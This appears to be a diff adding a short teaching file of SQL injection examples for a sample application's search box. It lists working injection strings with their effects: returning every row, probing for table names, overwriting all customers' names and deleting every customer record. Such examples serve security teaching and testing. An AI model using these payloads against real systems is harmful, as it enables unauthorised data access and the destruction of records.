@@ -1,0 +1,23 @@
+Here are some examples of hostile input yuo could put into the search text box
+of our sample appliction.
+
+
+1.  Fred' OR 1 = 1 --
+
+This should return all rows in the table, since 1 = 1 is true for all of them.
+
+2. Jones' AND (select count(*) from users) > 0 --
+
+This will throw an exception since there is no table named 'users'.
+
+3. Jones' AND (select count(*) from customers) > 0 --
+
+This will return Jones' record since there is a user named Jones
+and there are rows in a table named 'customers'.
+
+4. Jones'; update customers set surname='Clark', forename='Tom' --
+Change everyone's names.
+
+
+4. Jones'; delete from customers --
+Delete everyone's records.
